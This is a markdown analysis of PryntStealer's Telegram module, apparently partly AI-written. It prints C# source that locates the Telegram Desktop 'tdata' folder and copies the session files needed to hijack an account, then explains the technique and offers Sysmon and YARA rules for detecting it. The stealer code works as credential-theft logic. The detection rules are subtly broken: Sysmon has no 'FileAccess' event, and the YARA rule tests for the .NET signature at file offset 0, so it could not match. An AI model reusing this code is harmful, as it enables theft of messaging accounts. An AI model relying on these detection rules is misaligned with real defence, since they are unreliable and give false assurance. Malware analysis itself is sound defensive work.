# PryntStealer - Telegram Session Harvesting from `tdata`

**Repository:** `MalwareSourceCode-main`  
**File:** `Win32/Stealers/Win32.PryntStealer/Win32.PryntStealer/Stub/Stub-Source2/Client.Modules.Passwords.Targe/Telegram.cs`  
**Language:** C#  
**MITRE ATT&CK:** T1528 (Steal Application Access Token), T1005 (Data from Local System)

## Overview

PryntStealer implements Telegram Desktop session hijacking by locating and copying the `tdata` directory. This directory contains all the necessary files to take over a user's session on a different machine without needing a password or 2FA code. The stealer is designed to be opportunistic; it does not terminate the Telegram process if it is running, meaning it will only succeed in copying the files if the application is closed. It intelligently identifies both standard and portable Telegram installations and selectively copies only the essential session files, ignoring large cache files.

## Code Snippet & Analysis

The logic is split into locating the `tdata` directory and then copying its contents.

```csharp
// 1. Locate the tdata directory
private static string GetTdata()
{
	// Default path for standard installation
	string defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
	
	// Check if Telegram.exe is running
	Process[] processes = Process.GetProcessesByName("Telegram");
	if (processes.Length == 0)
	{
		// If not running, assume default path
		return defaultPath;
	}
	
	// If running, it might be a portable version. Get path from the running process.
	return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processes[0])), "tdata");
}

// 2. Copy session files from the located tdata directory
public static bool GetTelegramSessions(string sSaveDir)
{
	string tdata = GetTdata();
	try
	{
		if (!Directory.Exists(tdata)) return false;
		
		// Selectively copy session-critical directories and files
		string[] directories = Directory.GetDirectories(tdata);
		foreach (string dir in directories)
		{
			// Session directories are always 16 characters long
			if (new DirectoryInfo(dir).Name.Length == 16)
			{
				string destFolder = Path.Combine(sSaveDir, new DirectoryInfo(dir).Name);
				Filemanager.CopyDirectory(dir, destFolder);
			}
		}

		string[] files = Directory.GetFiles(tdata);
		foreach (string file in files)
		{
			FileInfo fileInfo = new FileInfo(file);
			// Copy small, essential files like key_datas and settings
			if (fileInfo.Length <= 5120)
			{
				if (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17 || 
                    fileInfo.Name.StartsWith("usertag") || 
                    fileInfo.Name.StartsWith("settings") || 
                    fileInfo.Name.StartsWith("key_data"))
				{
					fileInfo.CopyTo(Path.Combine(sSaveDir, fileInfo.Name));
				}
			}
		}
		return true;
	}
	catch
	{
		// Fails silently if Telegram is running and files are locked
		return false;
	}
}
```

### What it does:

1.  **Detects `tdata` Location:** The `GetTdata` method is a clever dual-purpose function. It first checks for a running `Telegram.exe` process. If found, it assumes a portable installation and derives the `tdata` path from the process's executable location. If no process is found, it falls back to the default installation path in `%APPDATA%`.
2.  **Attempts to Copy Session Files:** The `GetTelegramSessions` function enumerates the contents of the located `tdata` directory.
3.  **Selective Harvesting:** Instead of copying the entire directory (which can be very large), it uses specific heuristics to grab only the necessary session files:
    *   It copies any subdirectory whose name is exactly 16 characters long, as these are the user session data folders.
    *   It copies small files (`<= 5120` bytes) that are known to be part of the session data, such as `key_datas`, `settings*`, and `usertag*`.
4.  **Fails Silently:** The entire copy operation is wrapped in a `try...catch` block. If Telegram is running, its files will be locked, causing a file access exception. The `catch` block handles this by simply returning `false`, effectively aborting the Telegram theft module without alerting the user.

### Why it's a TTP:

This is a clear example of **T1528 - Steal Application Access Token**. The `tdata` directory is a form of application credential that grants full session access. The malware demonstrates specific, expert knowledge of Telegram's file structure, knowing to look for 16-character directory names and specific files like `key_datas`. While this particular variant lacks a process termination step, its ability to locate portable installations and selectively harvest key files makes it an effective and stealthy credential theft tool when its target application is not running.

## Detection & Evasion

### Sysmon Rule

Detection can focus on the anomalous behavior of a non-Telegram process enumerating and reading from the `tdata` directory.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Telegram Session Harvesting" groupRelation="or">
            <FileAccess onmatch="include">
                <!-- Detects access to the tdata directory by an unauthorized process -->
                <TargetFilename condition="contains">\Telegram Desktop\tdata\</TargetFilename>
                <!-- Exclude legitimate access by Telegram itself -->
                <Image condition="not end with">\Telegram.exe</Image>
            </FileAccess>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule is effective for detecting the "copy" part of the attack. More advanced versions of this attack would first show a `ProcessTerminate` event for `Telegram.exe`, which could be correlated with this file access for an even higher-fidelity alert.

### Yara Rule

A Yara rule can detect PryntStealer's Telegram module by searching for the combination of strings related to the `tdata` path and the file/directory names it targets.

```yara
rule TTP_PryntStealer_Telegram_Harvest
{
    meta:
        author = "GitHub Copilot"
        description = "Detects PryntStealer's .NET module for harvesting Telegram tdata sessions."
        mitre_ttp = "T1528"
        malware = "PryntStealer"
    strings:
        // Target process and directory
        $s1 = "Telegram.exe" wide
        $s2 = "Telegram Desktop\\\\tdata" wide
        
        // Key file names
        $s3 = "usertag" wide
        $s4 = "settings" wide
        $s5 = "key_data" wide

        // Logic artifact
        $logic1 = "GetTelegramSessions" wide

    condition:
        // Requires .NET header, Telegram strings, and key file names
        uint32(0) == 0x424A5342 and // .NET Header
        all of ($s*) and $logic1
}
```
**Note:** This rule is specific to .NET binaries (`uint32(0) == 0x424A5342`). It requires the presence of all the key strings (`$s*`) and the main function name (`$logic1`), making it a reliable signature for this module.
